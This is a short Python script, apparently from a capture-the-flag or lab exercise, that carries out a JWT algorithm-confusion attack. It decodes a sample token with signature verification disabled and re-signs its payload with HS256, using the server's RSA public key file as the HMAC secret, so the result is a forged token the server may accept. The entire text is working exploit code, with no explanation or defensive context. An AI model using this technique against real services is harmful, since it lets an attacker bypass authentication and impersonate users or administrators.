import jwt
old_token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLCJhZG1pbiI6ZmFsc2UsImV4cCI6MTczOTc5NDUyNn0.YZkooxKQtOU2MCIuQmde39oIEu2i9QHIgQ1d3M-NibM'
old_token_payload = jwt.decode(old_token, verify=False, algorithms='HS256')
public_key = open('pubkey.pem', 'r').read()
new_token = jwt.encode(old_token_payload, key=public_key, algorithm='HS256')
print(new_token)